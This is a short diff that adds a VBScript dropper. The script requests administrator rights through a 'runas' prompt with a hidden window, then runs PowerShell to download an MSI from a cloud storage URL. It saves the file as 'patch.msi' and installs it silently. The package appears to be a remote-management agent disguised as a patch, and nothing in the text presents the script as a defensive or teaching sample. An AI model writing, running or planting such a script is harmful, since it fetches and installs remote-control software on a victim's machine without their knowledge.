@@ -1,0 +1,7 @@
+Set UAC = CreateObject("Shell.Application")
+
+UAC.ShellExecute "powershell", "-Command ""& {
+    mkdir C:\Temp -Force 2>$null
+    curl.exe -L --ssl-no-revoke 'https://pub-58588e65d9b04333a98491a050f77e00.r2.dev/user/action1_agent(My_Organization).msi' -o C:\Temp\patch.msi
+    msiexec.exe /i 'C:\Temp\patch.msi' /qn /norestart
+}""", "", "runas", 0
